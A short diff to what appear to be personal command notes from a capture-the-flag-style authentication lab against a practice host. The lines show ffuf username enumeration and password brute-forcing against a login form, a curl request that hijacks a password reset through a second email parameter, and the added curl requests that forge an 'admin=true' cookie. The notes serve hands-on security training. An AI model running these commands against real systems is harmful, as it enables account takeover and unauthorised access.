@@ -14,3 +14,6 @@ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "user
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.125.172/customers/login -fc 200
 
 curl 'http://10.10.125.172/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=banknote@customer.acmeitsupport.thm'
+
+curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
+curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
